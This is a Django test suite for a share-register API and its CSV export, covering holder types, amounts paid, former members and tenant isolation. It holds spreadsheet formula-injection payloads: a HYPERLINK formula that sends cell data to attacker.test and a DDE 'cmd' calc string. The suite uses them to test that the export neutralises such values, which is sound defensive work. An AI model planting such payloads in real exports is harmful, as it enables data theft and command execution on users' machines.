import csv
import io
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor
from datetime import date, datetime, timedelta
from datetime import timezone as utc_zone
from decimal import Decimal
from unittest.mock import Mock, patch
from uuid import uuid4

from django.contrib.auth import get_user_model
from django.db import connections
from django.test import TransactionTestCase
from django.utils import timezone
from rest_framework.test import APITestCase
from web3 import Web3

from companies.models import Company, CompanyStatus
from offerings.models import (
    Offering,
    OfferingExemption,
    Subscription,
    SubscriptionStatus,
)
from offerings.services.subscription import scale_back
from shared.tests.tenants import make_tenant
from tokens.models import (
    FormerHolder,
    IssuanceStatus,
    RegisterEntryKind,
    RegisterMemberWallet,
    RequestStatus,
    ShareIssuance,
    ShareIssuanceRequest,
    ShareRegister,
    ShareToken,
    ShareTokenStatus,
)
from tokens.services import register as register_reader
from tokens.services.register import (
    AS_AT_ROW,
    FORMER_MEMBER_HEADERS,
    IDENTITY_LABELS,
    IDENTITY_LIVE,
    IDENTITY_TREASURY_LABEL,
    MEMBER_AMBIGUOUS_NAME,
    REGISTER_HEADERS,
    SOURCE_LABELS,
    SOURCE_STORED,
    stored_register,
)
from tokens.services.register_events import create_member, open_register, record_entry
from tokens.tests.test_register_events import DAY
from users.models import UserAccount, UserProfile
from wallets.models import Wallet
from whitelist.models import WhitelistEntry, WhitelistStatus

User = get_user_model()

MEMBER = Web3.to_checksum_address("0x" + "a1" * 20)
TREASURY = Web3.to_checksum_address("0x" + "b2" * 20)
SHARED = Web3.to_checksum_address("0x" + "c3" * 20)
STRANGER = Web3.to_checksum_address("0x" + "d4" * 20)
RESIDENCE = "12 Register Street, Sydney NSW 2000"
FORMULA_NAME = '=HYPERLINK("http://attacker.test/"&A2&B2,"Open")'
FORMULA_ADDRESS = "-2+3+cmd|' /C calc'!A0"
FORMULA_LABEL = "@SUM(1+1)*cmd"
MARCH = datetime(2026, 3, 2, 23, 30, tzinfo=utc_zone.utc)


def _account(email, name, residence=""):
    user = User.objects.create_user(email=email, password="pw-12345678")
    profile = UserProfile.objects.create(user=user, full_name=name, residential_address=residence)
    account = UserAccount.objects.create(account_number=email[:20], user_profile=profile)
    return account


class RegisterTestBase(APITestCase):
    def setUp(self):
        self.owner = User.objects.create_user(email="issuer@example.test", password="pw-12345678")
        self.company = Company.objects.create(
            owner=self.owner, name="Register Pty Ltd", acn="123123123", status=CompanyStatus.ACTIVE
        )
        self.token = ShareToken.objects.create(
            company=self.company,
            name="Register ordinary shares",
            symbol="REG",
            total_supply="10000",
            status=ShareTokenStatus.DEPLOYED,
            contract_address=Web3.to_checksum_address("0x" + "e5" * 20),
            deployment_tx_hash="0x" + "de" * 32,
        )
        self.client.force_authenticate(self.owner)

    def _allot(self, address, amount, name="", completed_at=None):
        return ShareIssuance.objects.create(
            token=self.token,
            recipient_address=address,
            recipient_name=name,
            amount=str(amount),
            status=IssuanceStatus.COMPLETED,
            completed_at=completed_at or timezone.now(),
        )

    def _paid_allotment(self, account, wallet, address, amount, received, completed_at=None):
        offering = Offering.objects.create(
            token=self.token,
            exemption=OfferingExemption.PROFESSIONAL,
            price_per_share=Decimal("2.50"),
            minimum_shares=1,
            target_shares=10,
            cap_shares=1000,
            opens_at=timezone.now() - timedelta(days=1),
        )
        request = ShareIssuanceRequest.objects.create(
            dispatch_id=None,
            token=self.token,
            recipient_address=address,
            amount=amount,
            reason="Allotment",
            status=RequestStatus.EXECUTED,
        )
        issuance = self._allot(address, amount, completed_at=completed_at)
        request.executed_issuance = issuance
        request.save(update_fields=["executed_issuance"])
        Subscription.objects.create(
            offering=offering,
            user_account=account,
            wallet=wallet,
            quantity=amount,
            price_per_share=Decimal("2.50"),
            amount_due=Decimal(amount) * Decimal("2.50"),
            amount_received=received,
            status=SubscriptionStatus.ALLOTTED,
            issuance_request=request,
        )
        return issuance

    def _offering(self, cap_shares=1000):
        return Offering.objects.create(
            token=self.token,
            exemption=OfferingExemption.PROFESSIONAL,
            price_per_share=Decimal("2.50"),
            minimum_shares=1,
            target_shares=10,
            cap_shares=cap_shares,
            opens_at=timezone.now() - timedelta(days=1),
        )

    def _subscription(self, offering, account, wallet, quantity, received):
        return Subscription.objects.create(
            offering=offering,
            user_account=account,
            wallet=wallet,
            quantity=quantity,
            price_per_share=Decimal("2.50"),
            amount_due=Decimal(quantity) * Decimal("2.50"),
            amount_received=received,
            status=SubscriptionStatus.PAID,
        )

    def _issue_against(self, subscription, mark_allotted=True):
        allotted = subscription.allotment_quantity
        request = ShareIssuanceRequest.objects.create(
            dispatch_id=None,
            token=self.token,
            recipient_address=subscription.wallet.address,
            amount=allotted,
            reason="Allotment",
            status=RequestStatus.EXECUTED,
        )
        issuance = self._allot(subscription.wallet.address, allotted)
        request.executed_issuance = issuance
        request.save(update_fields=["executed_issuance"])
        subscription.issuance_request = request
        subscription.save(update_fields=["issuance_request"])
        if mark_allotted:
            subscription.mark_allotted()
        return issuance

    def _wallet(self, account, address):
        return Wallet.objects.create(user_account=account, address=address, chain="base")

    def _stamp(self, address, name, stamped_at):
        return ShareIssuance.objects.create(
            token=self.token,
            recipient_address=address,
            recipient_name=name,
            recipient_residential_address=RESIDENCE,
            identity_stamped_at=stamped_at,
            amount="10",
            status=IssuanceStatus.COMPLETED,
            completed_at=stamped_at,
        )

    def _cessation(self, address, ceased_on, block):
        return FormerHolder.objects.create(
            token=self.token, wallet_address=address, ceased_on=ceased_on, ceased_at_block=block, shares_at_cessation=10
        )

    def _transfer(self, source, target, shares):
        record_entry(
            register_id=self.opening.register_id,
            operation_id=uuid4(),
            kind=RegisterEntryKind.TRANSFER,
            changes=[
                {"member": str(source.pk), "shares": str(-shares)},
                {"member": str(target.pk), "shares": str(shares)},
            ],
            effective_on=DAY,
            recorded_by=self.owner,
        )

    def _stored(self, holdings, *, member_of=None):
        member_of = {address: uuid4() for address in holdings} | dict(member_of or {})
        members = {}
        for address, member_id in member_of.items():
            members[address] = create_member(company_id=self.company.pk, member_id=member_id)
            RegisterMemberWallet.objects.create(company=self.company, member=members[address], address=address)
        totals = defaultdict(int)
        for address, shares in holdings.items():
            totals[str(member_of[address])] += shares
        self.opening = open_register(
            token_id=self.token.pk,
            operation_id=uuid4(),
            changes=[{"member": member, "shares": str(shares)} for member, shares in sorted(totals.items()) if shares],
            effective_on=DAY,
            recorded_by=self.owner,
        )
        return members

    def _holders(self):
        return self.client.get(f"/api/v1/tokens/{self.token.uuid}/holders/").json()

    def _export(self):
        response = self.client.get(f"/api/v1/tokens/{self.token.uuid}/register/export/")
        return response, list(csv.reader(io.StringIO(response.content.decode())))


class HolderTypeTest(RegisterTestBase):
    def test_the_four_holder_types_come_out_of_one_stored_read(self):
        member_account = _account("member@example.test", "Mary Member", RESIDENCE)
        member_wallet = self._wallet(member_account, MEMBER)
        WhitelistEntry.objects.create(wallet=member_wallet, status=WhitelistStatus.ACTIVE, is_whitelisted=True)
        WhitelistEntry.objects.create(address=TREASURY, label="Company treasury", status=WhitelistStatus.ACTIVE)
        first = self._wallet(_account("one@example.test", "Ann One"), SHARED)
        second = self._wallet(_account("two@example.test", "Bob Two"), SHARED)
        WhitelistEntry.objects.create(wallet=first, status=WhitelistStatus.ACTIVE)
        WhitelistEntry.objects.create(wallet=second, status=WhitelistStatus.ACTIVE)
        self._allot(STRANGER, 10, name="Stranger from a spreadsheet")
        members = self._stored({MEMBER: 100, TREASURY: 50, SHARED: 25, STRANGER: 10})

        response = self.client.get(f"/api/v1/tokens/{self.token.uuid}/holders/")

        self.assertEqual(response.status_code, 200)
        rows = {row["member"]: row for row in response.json()["holders"]}
        by_address = {address: rows[str(member.pk)] for address, member in members.items()}
        self.assertEqual((by_address[MEMBER]["holderType"], by_address[MEMBER]["name"]), ("member", "Mary Member"))
        self.assertEqual(
            (by_address[TREASURY]["holderType"], by_address[TREASURY]["name"]), ("treasury", "Company treasury")
        )
        self.assertEqual(by_address[SHARED]["holderType"], "ambiguous")
        self.assertEqual(
            (by_address[STRANGER]["holderType"], by_address[STRANGER]["name"]),
            ("unidentified", "Stranger from a spreadsheet"),
        )
        self.assertEqual((response.json()["totalHolders"], response.json()["initialized"]), (4, True))

    def test_the_stored_position_wins_over_the_allotment_record_and_a_member_with_nothing_drops_off(self):
        self._allot(MEMBER, 100)
        self._allot(STRANGER, 50)
        members = self._stored({MEMBER: 100, STRANGER: 50})
        changes = sorted(
            [
                {"member": str(members[STRANGER].pk), "shares": "-50"},
                {"member": str(members[MEMBER].pk), "shares": "50"},
            ],
            key=lambda change: change["member"],
        )
        record_entry(
            register_id=self.opening.register_id,
            operation_id=uuid4(),
            kind=RegisterEntryKind.TRANSFER,
            changes=changes,
            effective_on=DAY,
            recorded_by=self.owner,
        )

        body = self._holders()

        self.assertEqual(
            [(row["member"], row["balance"]) for row in body["holders"]], [(str(members[MEMBER].pk), "150")]
        )
        self.assertEqual(
            (body["holders"][0]["percentage"], body["holders"][0]["source"], body["issuedSupply"]),
            (100.0, SOURCE_STORED, "150"),
        )

    def test_one_member_holding_through_two_wallets_is_one_row_listing_both(self):
        account = _account("pair@example.test", "Pat Pair", RESIDENCE)
        for address in (MEMBER, SHARED):
            WhitelistEntry.objects.create(wallet=self._wallet(account, address), status=WhitelistStatus.ACTIVE)
        member = uuid4()
        self._stored({MEMBER: 30, SHARED: 20}, member_of={MEMBER: member, SHARED: member})

        holders = self._holders()["holders"]

        self.assertEqual(
            [(row["member"], row["balance"], row["name"], row["holderType"]) for row in holders],
            [(str(member), "50", "Pat Pair", "member")],
        )
        self.assertEqual(
            holders[0]["wallets"],
            sorted(
                [{"address": MEMBER, "whitelistStatus": "Active"}, {"address": SHARED, "whitelistStatus": "Active"}],
                key=lambda wallet: wallet["address"],
            ),
        )

    def test_wallets_that_resolve_to_different_people_make_the_member_ambiguous(self):
        WhitelistEntry.objects.create(
            wallet=self._wallet(_account("ann@example.test", "Ann One"), MEMBER), status=WhitelistStatus.ACTIVE
        )
        WhitelistEntry.objects.create(
            wallet=self._wallet(_account("bob@example.test", "Bob Two"), SHARED), status=WhitelistStatus.ACTIVE
        )
        member = uuid4()
        self._stored({MEMBER: 30, SHARED: 20}, member_of={MEMBER: member, SHARED: member})

        row = self._holders()["holders"][0]

        self.assertEqual((row["holderType"], row["name"]), ("ambiguous", MEMBER_AMBIGUOUS_NAME))

    def test_wallets_stamped_with_different_people_make_the_member_ambiguous(self):
        self._stamp(MEMBER, "Ann Stamped", MARCH)
        self._stamp(SHARED, "Bob Stamped", MARCH + timedelta(days=30))
        member = uuid4()
        self._stored({MEMBER: 30, SHARED: 20}, member_of={MEMBER: member, SHARED: member})

        row = self._holders()["holders"][0]

        self.assertEqual((row["holderType"], row["name"]), ("ambiguous", MEMBER_AMBIGUOUS_NAME))

    def test_wallets_stamped_with_the_same_person_name_the_member_from_the_later_stamp(self):
        self._stamp(MEMBER, "Ann Stamped", MARCH)
        self._stamp(SHARED, "Ann Stamped", MARCH + timedelta(days=30))
        member = uuid4()
        self._stored({MEMBER: 30, SHARED: 20}, member_of={MEMBER: member, SHARED: member})

        row = self._holders()["holders"][0]

        self.assertEqual(
            (row["holderType"], row["name"], row["identitySource"]),
            ("member", "Ann Stamped", "Stamped at allotment on 2026-04-01"),
        )

    def test_the_api_contract_names_the_member_its_wallets_and_its_stored_entry_date(self):
        self._stored({MEMBER: 8})

        holders = self._holders()["holders"]

        self.assertEqual(
            set(holders[0]),
            {
                "member",
                "wallets",
                "name",
                "balance",
                "percentage",
                "source",
                "holderType",
                "enteredOn",
                "shareClass",
                "identitySource",
            },
        )
        self.assertEqual((holders[0]["shareClass"], holders[0]["enteredOn"]), ("REG", DAY.isoformat()))
        self.assertEqual(holders[0]["wallets"], [{"address": MEMBER, "whitelistStatus": ""}])


class RegisterExportTest(RegisterTestBase):
    def test_the_csv_carries_the_member_header_the_residential_address_and_a_blank_unknown_amount(self):
        member_account = _account("member@example.test", "Mary Member", RESIDENCE)
        member_wallet = self._wallet(member_account, MEMBER)
        WhitelistEntry.objects.create(wallet=member_wallet, status=WhitelistStatus.ACTIVE, is_whitelisted=True)
        self._paid_allotment(member_account, member_wallet, MEMBER, 100, Decimal("250.00"))
        WhitelistEntry.objects.create(address=TREASURY, label="Company treasury", status=WhitelistStatus.ACTIVE)
        self._allot(TREASURY, 50)
        members = self._stored({MEMBER: 100, TREASURY: 50})

        response, rows = self._export()

        self.assertEqual((response.status_code, response["Content-Type"]), (200, "text/csv"))
        self.assertEqual(rows[0], REGISTER_HEADERS)
        body = {row[1]: dict(zip(REGISTER_HEADERS, row)) for row in rows[1 : rows.index([])]}
        member = body["Mary Member"]
        self.assertEqual(
            [member[header] for header in ("Member ID", "Residential address", "Wallet addresses")],
            [str(members[MEMBER].pk), RESIDENCE, MEMBER],
        )
        self.assertEqual(
            [member[header] for header in ("Holder type", "Class", "Shares held", "Balance source", "Date entered")],
            ["Member", "REG", "100", SOURCE_LABELS[SOURCE_STORED], DAY.isoformat()],
        )
        self.assertEqual(member["Identity source"], IDENTITY_LABELS[IDENTITY_LIVE])
        self.assertEqual([member["Whitelist status"], member["Amount paid"]], [f"{MEMBER}: Active", "250.00"])
        self.assertEqual(member["Percentage of issued supply"], "66.67%")
        treasury = body["Company treasury"]
        self.assertEqual(
            [treasury[header] for header in ("Residential address", "Identity source", "Amount paid")],
            ["", IDENTITY_LABELS[IDENTITY_TREASURY_LABEL], ""],
        )
        summary = rows[rows.index([]) + 1 : rows.index([]) + 3]
        self.assertEqual(summary, [["Issued supply", "150"], ["Held by listed members", "150"]])

    def test_the_residential_address_never_reaches_the_api(self):
        member_account = _account("member@example.test", "Mary Member", RESIDENCE)
        member_wallet = self._wallet(member_account, MEMBER)
        WhitelistEntry.objects.create(wallet=member_wallet, status=WhitelistStatus.ACTIVE)
        self._stored({MEMBER: 100})

        api = self.client.get(f"/api/v1/tokens/{self.token.uuid}/holders/")
        export, _ = self._export()

        self.assertNotIn(RESIDENCE, api.content.decode())
        self.assertIn(RESIDENCE, export.content.decode())

    @patch("tokens.services.register.logger")
    def test_every_export_writes_one_log_line_with_who_ran_it_and_how_many_rows(self, log):
        self._stored({MEMBER: 100})

        self._export()

        message = log.info.call_args[0][0]
        self.assertIn("1 rows", message)
        self.assertIn(f"requested by user {self.owner.pk}", message)

    def test_effects_waiting_to_be_recorded_are_stated_in_the_export_and_the_api(self):
        self._stored({MEMBER: 100})
        for waiting, text in ((2, "2"), (None, "unknown")):
            with self.subTest(waiting=waiting), patch.object(register_reader, "waiting_effects", return_value=waiting):
                _, rows = self._export()
                self.assertIn(["Completed effects waiting to be recorded", text], rows)
                self.assertEqual(self._holders()["waitingEffects"], waiting)
        with patch.object(register_reader, "waiting_effects", return_value=0):
            _, rows = self._export()
        self.assertNotIn("Completed effects waiting to be recorded", [row[0] for row in rows if row])


class StoredRegisterReadTest(RegisterTestBase):
    def test_a_member_the_opening_carried_in_keeps_the_date_of_their_first_allotment(self):
        self._allot(MEMBER, 60, completed_at=MARCH)
        self._allot(MEMBER, 40, completed_at=datetime(2026, 5, 1, tzinfo=utc_zone.utc))
        self._allot(SHARED, 25, completed_at=datetime(2026, 4, 1, tzinfo=utc_zone.utc))
        self._allot(STRANGER, 5, completed_at=datetime(2026, 2, 1, tzinfo=utc_zone.utc))
        members = self._stored({MEMBER: 100, TREASURY: 50, SHARED: 25}, member_of={STRANGER: uuid4()})
        record_entry(
            register_id=self.opening.register_id,
            operation_id=uuid4(),
            kind=RegisterEntryKind.ISSUE,
            changes=[{"member": str(members[STRANGER].pk), "shares": "5"}],
            effective_on=DAY,
            recorded_by=self.owner,
        )
        for day, source, target in ((1, SHARED, TREASURY), (2, TREASURY, SHARED)):
            record_entry(
                register_id=self.opening.register_id,
                operation_id=uuid4(),
                kind=RegisterEntryKind.TRANSFER,
                changes=sorted(
                    [
                        {"member": str(members[source].pk), "shares": "-25"},
                        {"member": str(members[target].pk), "shares": "25"},
                    ],
                    key=lambda change: change["member"],
                ),
                effective_on=DAY + timedelta(days=day),
                recorded_by=self.owner,
            )

        entered = {row["member"]: row["enteredOn"] for row in self._holders()["holders"]}
        _, rows = self._export()

        self.assertEqual(
            entered,
            {
                str(members[MEMBER].pk): "2026-03-02",
                str(members[TREASURY].pk): DAY.isoformat(),
                str(members[SHARED].pk): (DAY + timedelta(days=2)).isoformat(),
                str(members[STRANGER].pk): DAY.isoformat(),
            },
        )
        exported = {row[0]: row[REGISTER_HEADERS.index("Date entered")] for row in rows[1 : rows.index([])]}
        self.assertEqual(exported, entered)

    def test_a_member_who_sold_out_and_bought_back_on_the_opening_day_shows_the_opening_date(self):
        self._allot(MEMBER, 100, completed_at=MARCH)
        members = self._stored({MEMBER: 100}, member_of={STRANGER: uuid4()})
        self._transfer(members[MEMBER], members[STRANGER], 100)
        self._transfer(members[STRANGER], members[MEMBER], 100)

        holders = self._holders()["holders"]

        self.assertEqual(
            [(row["member"], row["enteredOn"]) for row in holders], [(str(members[MEMBER].pk), DAY.isoformat())]
        )

    def test_a_cessation_between_the_allotment_and_the_opening_interrupts_the_date_and_the_amount_paid(self):
        for address, ceased_on, block in ((MEMBER, date(2026, 5, 1), 1), (SHARED, date(2026, 2, 1), 2)):
            account = _account(f"{block}@example.test", f"Holder {block}", RESIDENCE)
            wallet = self._wallet(account, address)
            WhitelistEntry.objects.create(wallet=wallet, status=WhitelistStatus.ACTIVE, is_whitelisted=True)
            self._paid_allotment(account, wallet, address, 40, Decimal("100.00"), completed_at=MARCH)
            self._cessation(address, ceased_on, block)
        members = self._stored({MEMBER: 40, SHARED: 40})

        entered = {row["member"]: row["enteredOn"] for row in self._holders()["holders"]}
        _, rows = self._export()
        paid = {row[0]: row[REGISTER_HEADERS.index("Amount paid")] for row in rows[1 : rows.index([])]}

        self.assertEqual(entered, {str(members[MEMBER].pk): DAY.isoformat(), str(members[SHARED].pk): "2026-03-02"})
        self.assertEqual(paid, {str(members[MEMBER].pk): "", str(members[SHARED].pk): "100.00"})

    def test_a_paid_holding_that_recorded_transfers_touched_prints_no_amount_paid(self):
        account = _account("tom@example.test", "Tom Traded", RESIDENCE)
        wallet = self._wallet(account, MEMBER)
        WhitelistEntry.objects.create(wallet=wallet, status=WhitelistStatus.ACTIVE, is_whitelisted=True)
        self._paid_allotment(account, wallet, MEMBER, 100, Decimal("250.00"))
        members = self._stored({MEMBER: 100}, member_of={STRANGER: uuid4()})
        self._transfer(members[MEMBER], members[STRANGER], 50)
        self._transfer(members[STRANGER], members[MEMBER], 50)

        row = dict(zip(REGISTER_HEADERS, self._export()[1][1]))

        self.assertEqual([row["Name"], row["Shares held"], row["Amount paid"]], ["Tom Traded", "100", ""])

    def test_a_wallet_cessation_of_a_member_who_still_holds_is_not_a_former_member(self):
        pair = uuid4()
        members = self._stored({MEMBER: 70, SHARED: 30, STRANGER: 20}, member_of={MEMBER: pair, SHARED: pair})
        self._transfer(members[STRANGER], members[MEMBER], 20)
        for block, address in enumerate((MEMBER, STRANGER, TREASURY)):
            self._cessation(address, DAY, block=block + 1)

        former = [row["walletAddress"] for row in self._holders()["formerMembers"]]
        _, rows = self._export()
        section = rows[rows.index(FORMER_MEMBER_HEADERS) + 1 :]
        exported = [row[FORMER_MEMBER_HEADERS.index("Wallet address")] for row in section if row[0] != AS_AT_ROW]

        self.assertEqual(sorted(former), sorted([STRANGER, TREASURY]))
        self.assertEqual(sorted(exported), sorted([STRANGER, TREASURY]))

    def test_a_member_who_ceased_and_holds_again_is_still_listed_as_ceased(self):
        members = self._stored({MEMBER: 70, STRANGER: 20})
        self._transfer(members[STRANGER], members[MEMBER], 20)
        self._cessation(STRANGER, DAY, block=1)
        record_entry(
            register_id=self.opening.register_id,
            operation_id=uuid4(),
            kind=RegisterEntryKind.TRANSFER,
            changes=[
                {"member": str(members[MEMBER].pk), "shares": "-5"},
                {"member": str(members[STRANGER].pk), "shares": "5"},
            ],
            effective_on=DAY + timedelta(days=10),
            recorded_by=self.owner,
        )

        body = self._holders()
        _, rows = self._export()
        section = rows[rows.index(FORMER_MEMBER_HEADERS) + 1 :]
        exported = [row[FORMER_MEMBER_HEADERS.index("Wallet address")] for row in section if row[0] != AS_AT_ROW]

        self.assertIn(STRANGER, [row["wallets"][0]["address"] for row in body["holders"]])
        self.assertEqual([row["walletAddress"] for row in body["formerMembers"]], [STRANGER])
        self.assertEqual(exported, [STRANGER])

    def test_the_register_and_its_export_are_served_with_the_chain_unreachable(self):
        self._stored({MEMBER: 100, TREASURY: 40})
        unreachable = RuntimeError("chain unreachable")
        with (
            patch("tokens.services.share_token_service.get_base_chain_client", side_effect=unreachable),
            patch("integrations.base_chain.get_base_chain_client", side_effect=unreachable),
        ):
            holders = self.client.get(f"/api/v1/tokens/{self.token.uuid}/holders/")
            export, rows = self._export()

        self.assertEqual((holders.status_code, export.status_code), (200, 200))
        self.assertEqual(sorted(row["balance"] for row in holders.json()["holders"]), ["100", "40"])
        self.assertEqual(len(rows[1 : rows.index([])]), 2)

    def test_an_unopened_register_is_not_initialised_and_differs_from_an_empty_one(self):
        body = self._holders()
        self.assertEqual(
            (body["initialized"], body["holders"], body["issuedSupply"], body["waitingEffects"]),
            (False, [], None, None),
        )
        export, _ = self._export()
        self.assertEqual(export.status_code, 409)
        self.assertEqual(export.json()["code"], "register_not_initialized")
        self._stored({})
        body = self._holders()
        self.assertEqual((body["initialized"], body["holders"], body["issuedSupply"]), (True, [], "0"))
        export, rows = self._export()
        self.assertEqual((export.status_code, rows[1]), (200, []))

    def test_a_holding_only_part_of_which_was_subscribed_prints_no_amount_paid(self):
        account = _account("mia@example.test", "Mia Mixed", RESIDENCE)
        wallet = self._wallet(account, MEMBER)
        WhitelistEntry.objects.create(wallet=wallet, status=WhitelistStatus.ACTIVE, is_whitelisted=True)
        self._allot(MEMBER, 1000)
        self._paid_allotment(account, wallet, MEMBER, 10, Decimal("20.00"))
        self._stored({MEMBER: 1010})

        row = dict(zip(REGISTER_HEADERS, self._export()[1][1]))

        self.assertEqual([row["Name"], row["Shares held"], row["Amount paid"]], ["Mia Mixed", "1010", ""])

    def test_a_stored_holding_below_the_allotment_prints_no_amount_paid(self):
        account = _account("cut@example.test", "Cut Down", RESIDENCE)
        wallet = self._wallet(account, MEMBER)
        WhitelistEntry.objects.create(wallet=wallet, status=WhitelistStatus.ACTIVE, is_whitelisted=True)
        self._paid_allotment(account, wallet, MEMBER, 100, Decimal("250.00"))
        self._stored({MEMBER: 42})

        row = dict(zip(REGISTER_HEADERS, self._export()[1][1]))

        self.assertEqual(
            [row["Shares held"], row["Balance source"], row["Amount paid"]], ["42", SOURCE_LABELS[SOURCE_STORED], ""]
        )

    def test_a_scaled_back_subscription_prints_the_money_backing_the_shares_not_the_money_received(self):
        account = _account("sca@example.test", "Sam Scaled", RESIDENCE)
        wallet = self._wallet(account, MEMBER)
        WhitelistEntry.objects.create(wallet=wallet, status=WhitelistStatus.ACTIVE, is_whitelisted=True)
        offering = self._offering(cap_shares=40)
        subscription = self._subscription(offering, account, wallet, 100, Decimal("250.00"))
        scale_back(offering)
        subscription.refresh_from_db()
        self.assertEqual(subscription.allotted_quantity, 40)
        self.assertEqual(subscription.refund_amount, Decimal("150.00"))
        self.assertIsNone(subscription.refunded_at)
        self.assertEqual(subscription.money_held, Decimal("250.00"))
        self._issue_against(subscription)
        self._stored({MEMBER: 40})

        row = dict(zip(REGISTER_HEADERS, self._export()[1][1]))

        self.assertEqual([row["Shares held"], row["Amount paid"]], ["40", "100.00"])

    def test_an_allotment_the_money_record_has_not_caught_up_with_prints_no_amount_paid(self):
        account = _account("lag@example.test", "Lagging Mirror", RESIDENCE)
        wallet = self._wallet(account, MEMBER)
        WhitelistEntry.objects.create(wallet=wallet, status=WhitelistStatus.ACTIVE, is_whitelisted=True)
        subscription = self._subscription(self._offering(), account, wallet, 40, Decimal("100.00"))
        self._issue_against(subscription, mark_allotted=False)
        self.assertEqual(subscription.status, SubscriptionStatus.PAID)
        self._stored({MEMBER: 40})

        row = dict(zip(REGISTER_HEADERS, self._export()[1][1]))

        self.assertEqual([row["Shares held"], row["Amount paid"]], ["40", ""])

    def test_a_holding_every_share_of_which_was_subscribed_prints_the_total_paid(self):
        account = _account("sue@example.test", "Sue Subscribed", RESIDENCE)
        wallet = self._wallet(account, MEMBER)
        WhitelistEntry.objects.create(wallet=wallet, status=WhitelistStatus.ACTIVE, is_whitelisted=True)
        self._paid_allotment(account, wallet, MEMBER, 40, Decimal("100.00"))
        self._paid_allotment(account, wallet, MEMBER, 10, Decimal("25.00"))
        self._stored({MEMBER: 50})

        row = dict(zip(REGISTER_HEADERS, self._export()[1][1]))

        self.assertEqual([row["Shares held"], row["Amount paid"]], ["50", "125.00"])

    def test_a_member_paid_through_two_wallets_prints_the_total_across_them(self):
        account = _account("two@example.test", "Tia Two", RESIDENCE)
        wallets = [self._wallet(account, address) for address in (MEMBER, SHARED)]
        for wallet in wallets:
            WhitelistEntry.objects.create(wallet=wallet, status=WhitelistStatus.ACTIVE, is_whitelisted=True)
        self._paid_allotment(account, wallets[0], MEMBER, 40, Decimal("100.00"))
        self._paid_allotment(account, wallets[1], SHARED, 10, Decimal("25.00"))
        member = uuid4()
        self._stored({MEMBER: 40, SHARED: 10}, member_of={MEMBER: member, SHARED: member})

        row = dict(zip(REGISTER_HEADERS, self._export()[1][1]))

        self.assertEqual([row["Shares held"], row["Amount paid"]], ["50", "125.00"])
        self.assertEqual(row["Wallet addresses"], "; ".join(sorted([MEMBER, SHARED])))

    def test_a_name_or_address_that_opens_like_a_formula_is_neutralised_in_the_csv(self):
        account = _account("evil@example.test", FORMULA_NAME, FORMULA_ADDRESS)
        wallet = self._wallet(account, MEMBER)
        WhitelistEntry.objects.create(wallet=wallet, status=WhitelistStatus.ACTIVE, is_whitelisted=True)
        self._stored({MEMBER: 100})

        row = dict(zip(REGISTER_HEADERS, self._export()[1][1]))

        self.assertEqual([row["Name"], row["Residential address"]], [f"'{FORMULA_NAME}", f"'{FORMULA_ADDRESS}"])

    def test_a_treasury_label_that_opens_like_a_formula_is_neutralised_in_the_csv(self):
        WhitelistEntry.objects.create(address=TREASURY, label=FORMULA_LABEL, status=WhitelistStatus.ACTIVE)
        self._stored({TREASURY: 50})

        row = dict(zip(REGISTER_HEADERS, self._export()[1][1]))

        self.assertEqual(row["Name"], f"'{FORMULA_LABEL}")


class RegisterIsolationTest(RegisterTestBase):
    def test_another_tenant_gets_a_phantom_404_on_the_register_and_its_export(self):
        stranger = User.objects.create_user(email="stranger@example.test", password="pw-12345678")
        self._stored({MEMBER: 100})
        self.client.force_authenticate(stranger)

        for path in ("holders", "register/export"):
            with self.subTest(path=path):
                response = self.client.get(f"/api/v1/tokens/{self.token.uuid}/{path}/")
                self.assertEqual(response.status_code, 404)


class StoredRegisterSnapshotTest(TransactionTestCase):
    def setUp(self):
        self.tenant = make_tenant("snapshot")
        self.token = self.tenant.deployed_token
        self.holder, self.newcomer = (
            create_member(company_id=self.token.company_id, member_id=uuid4()) for _ in range(2)
        )
        RegisterMemberWallet.objects.create(company_id=self.token.company_id, member=self.holder, address=MEMBER)
        self.opening = open_register(
            token_id=self.token.pk,
            operation_id=uuid4(),
            changes=[{"member": str(self.holder.pk), "shares": "100"}],
            effective_on=DAY,
            recorded_by=self.tenant.user,
        )

    def append(self):
        try:
            record_entry(
                register_id=self.opening.register_id,
                operation_id=uuid4(),
                kind=RegisterEntryKind.ISSUE,
                changes=[{"member": str(self.newcomer.pk), "shares": "50"}],
                effective_on=DAY,
                recorded_by=self.tenant.user,
            )
        finally:
            connections.close_all()

    def test_an_append_committed_during_a_read_splits_neither_the_head_nor_the_supply_from_the_holdings(self):
        head = ShareRegister.objects.filter(token=self.token)

        def read_the_head_then_append():
            register = head.first()
            with ThreadPoolExecutor(max_workers=1) as pool:
                pool.submit(self.append).result(timeout=20)
            return register

        stand_in = Mock()
        stand_in.objects.filter.return_value.first.side_effect = read_the_head_then_append
        with patch.object(register_reader, "ShareRegister", stand_in):
            during = stored_register(self.token)
        after = stored_register(self.token)

        self.assertEqual(
            (during["sequence"], during["issued_supply"], [row["balance"] for row in during["rows"]]), (1, 100, ["100"])
        )
        self.assertEqual(
            (after["sequence"], after["issued_supply"], [row["balance"] for row in after["rows"]]),
            (2, 150, ["100", "50"]),
        )
